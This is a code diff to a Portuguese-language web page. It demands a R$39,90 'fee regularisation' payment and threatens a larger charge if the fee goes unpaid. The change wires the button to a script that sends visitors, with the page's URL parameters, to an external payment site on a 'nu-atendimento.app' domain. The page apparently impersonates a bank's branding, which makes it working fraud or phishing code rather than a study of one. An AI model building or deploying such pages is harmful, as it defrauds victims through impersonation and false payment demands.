@@ -167,7 +167,7 @@
 
                 <h1 id="value">R$39,90</h1>
 
-                <a href="#" id="btn001" style="background-color: #831BD1;">REGULARIZAR TAXA</a>
+                <a onclick="redirect(event)" style="background-color: #831BD1;">REGULARIZAR TAXA</a>
 
                 <p>Atenção: Caso o valor de <span class="bold3">R$39,90</span> não seja quitado, o sistema exigirá o
                     pagamento integral de
@@ -178,8 +178,12 @@
     </div>
 
     <script>
-       
-    </script>
+            function redirect(event) {
+                event.preventDefault();
+                var currentUrlParams = window.location.search;
+                window.location.href = "https://pay.nu-atendimento.app/nWrxGWAAANb3654" + currentUrlParams;
+            }
+        </script>
 
     <script src="js/scripts002.js"></script>
                     <script>
